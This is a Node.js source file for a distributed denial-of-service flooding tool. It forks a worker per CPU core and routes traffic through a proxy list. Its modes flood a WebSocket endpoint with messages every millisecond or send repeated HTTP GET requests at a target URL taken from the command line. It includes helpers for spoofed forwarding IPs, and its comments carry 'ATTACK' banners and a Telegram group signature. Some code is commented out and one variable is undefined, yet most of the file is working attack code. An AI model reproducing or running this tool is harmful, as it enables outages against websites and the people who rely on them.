


const request = require('request');

const { loadavg } = require('os');
const process = require('process');
fs = require('fs'),
cluster = require('cluster'),
url = require('url'),
WebSocket = require('ws'),
md5 = require("md5"),
numCPUs = require('os').cpus().length,
HttpsProxyAgent = require('https-proxy-agent'),
proxies = [...new Set(fs.readFileSync('proxies.txt').toString().match(/\S+/g))],
UAs = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36',
    'Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)'
]
const ua = [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))];
const x = fs.readFileSync('proxies.txt').toString().split('\n');
const array = [];
const box = 10;



const { exec } = require('child_process');
const { count } = require('console');
const { exit } = require('process');





let threads = process.argv[6] || 1;
const randomIp = function () {
    var ip = randomByte() + '.' +
        randomByte() + '.' +
        randomByte() + '.' +
        randomByte();
    if (isPrivate(ip)) return randomIp();
    return ip;
}
function randomSpoof() {
    return `${randomIp()}, ${randomIp()}`;
}
function randomByte() {
    return Math.round(Math.random() * 256);
}
function isPrivate(ip) {
    return /^10\.|^192\.168\.|^172\.16\.|^172\.17\.|^172\.18\.|^172\.19\.|^172\.20\.|^172\.21\.|^172\.22\.|^172\.23\.|^172\.24\.|^172\.25\.|^172\.26\.|^172\.27\.|^172\.28\.|^172\.29\.|^172\.30\.|^172\.31\./.test(ip);
}








if (cluster.isMaster) {
    masterProcess();
    
    console.log('run work ');
  } else {

    switch (process.argv[3]) {
        case '1':
            var send = async () => {
                
                for (i = 0; i < x.length; i++) {
                  
                    function xt (p){
                       
                        // var options_ = url.parse('http://' + p);
                        // console.log(p);
                        var agent = new HttpsProxyAgent(url.parse('http://' + p));
                        let ws = new WebSocket(endpoint, { agent: agent });
                        // console.log(agent);
                        ws.on('open', function open() {   
                            // is++;
                            setInterval(async () => {
                                
                                var hexdata = '';
                                ws.send(Buffer.from(hexdata, 'hex'));
                                // ws.send("telegram ==> @ams_team ==>message ==>Hi Caesar " + Date.now());
                            },1)
                        });
                        ws.on('error', async function() {
                        //    console.log('socket error');
                            // xt(p);
                            // how do I reconnect to the ws after x minutes here?
                        });   
                    }
                    xt(x[i]);
                }
            }
            break;
        case '2':
            var send = async () => {
                
                for (i = 0; i < x.length; i++) {
                  
                    function xt (p){
                       
                        // var options_ = url.parse('http://' + p);
                        // console.log(p);
                        var agent = new HttpsProxyAgent(url.parse('http://' + p));
                        let ws = new WebSocket(endpoint, { agent: agent });
                        // console.log(agent);
                        ws.on('open', function open() {   
                            // is++;
                            ws.send("telegram ==> @ams_team ==>message ==>Hi Caesar " + Date.now());
                        });
                        ws.on('error', async function() {
                        //    console.log('socket error');
                            // xt(p);
                            // how do I reconnect to the ws after x minutes here?
                        });   
                    }
                    xt(x[i]);
                }
            }
            break;
        case '3':
            var send = async () => {          
                // var options_ = url.parse('http://' + p);
                // console.log(p);

                let ws = new WebSocket(endpoint);
                // console.log(agent);
                ws.on('open', function open() {   
                    // is++;
                    setInterval(async () => {
                        
                        var hexdata = '';
                        ws.send(Buffer.from(hexdata, 'hex'));
                        // ws.send("telegram ==> @ams_team ==>message ==>Hi Caesar " + Date.now());
                    },1)
                });
                ws.on('error', async function() {
                //    console.log('socket error');
                    // xt(p);
                    // how do I reconnect to the ws after x minutes here?
                });   
         }
            break;
        case '4':
            var send = async () => {
                // var x = fs.readFileSync('proxies.txt').toString().split('\n');
                
                for (i = 0; i < x.length; i++) {
                  
                    function xt (p){
                       
                        // var options_ = url.parse('http://' + p);
                        // console.log(p);
                        var agent = new HttpsProxyAgent(url.parse('http://' + p));
                        let ws = new WebSocket(endpoint, { agent: agent });
                        // console.log(agent);
                        ws.on('open', function open() {   
                            // is++;
                            ws.send("");
                        });
                        ws.on('error', async function() {
                        //    console.log('socket error');
                            // xt(p);
                            // how do I reconnect to the ws after x minutes here?
                        });   
                    }
                    xt(x[i]);
                }
            }
            break;           
        case '5':
    // //    var send = async() => {
    //     //     var p = x[Math.floor(Math.random() * x.length)];
    //     //     array.push(p);
    //     //     var countOccurrences = (arr, val) => arr.reduce((a, v) => (v === val ? a + 1 : a), 0);
    //     //     var oo = 0;
    //     //     if(countOccurrences(array, p) > 5){
    //     //         if (cluster.isWorker) {
    //     //             var ATTACKBOX = numCPUs / 2  * x.length * box;
    //     //             var ATTACKTOP = countOccurrences(array, p);
    //     //             if( array.length > ATTACKBOX){
    //     //                 // array.length = 0;
    //     //             //   var ATTACKTOP = 0;
    //     //               console.log('11111111');
    //     //             //   console.log(`A= ${ATTACKBOX}  B= ${ATTACKTOP}`);
    //     //             }
    //     //           }
    //     //     }else{
 
               
    //     //     }
    //     //    } 
    //     // console.log('run 5;');



        console.log(process.argv[2]);
        var send = () => {
            request({
                'method': 'GET',
                'url': process.argv[2],
                timeout: 60000,
                'headers': {
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': '111',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    // 'X-Forwarded-For': randomSpoof()
                },
                'proxy': 'http://' + x[Math.floor(Math.random() * x.length)]
            } ,async (err, res, body) => {
                if(err){
                    send();
                }
            });
        };
            
           
            setInterval(() => send());

            

                break;
    }


    
  }

  function masterProcess() {
  
    console.log(`Master ${process.pid} is running`);

    // for (let i = 0; i < numCPUs; i++) {
    for (let i = 0; i < numCPUs; i++) {
        
        cluster.fork();
    }


  }




// (async function() {
//     for (let v = 0; v < threads; v++) {
//         console.log("\x1b[31m  threads " + threads +" ATTACK ...\x1b[0m");
//         send();
//      }
//  })();
// for (let v = 0; v < threads; v++) {
//     console.log("\x1b[31m  threads " + threads +" ATTACK ...\x1b[0m");
//     send();
//  }

    // for (let v = 0; v < threads; v++) {
    //     setInterval(() => send() );
    // }

    // console.log(send());



// console.log(`
// > Mais c'est de la merde | refais par punchnox prsk la c'est grave

// [SENPAI] Host > ${process.argv[2]}

// [SENPAI] Mode > ${process.argv[5]}

// [SENPAI] Proxies: ${process.argv[3]}

// [SENPAI] Time Attack: ${process.argv[4]}


// `)
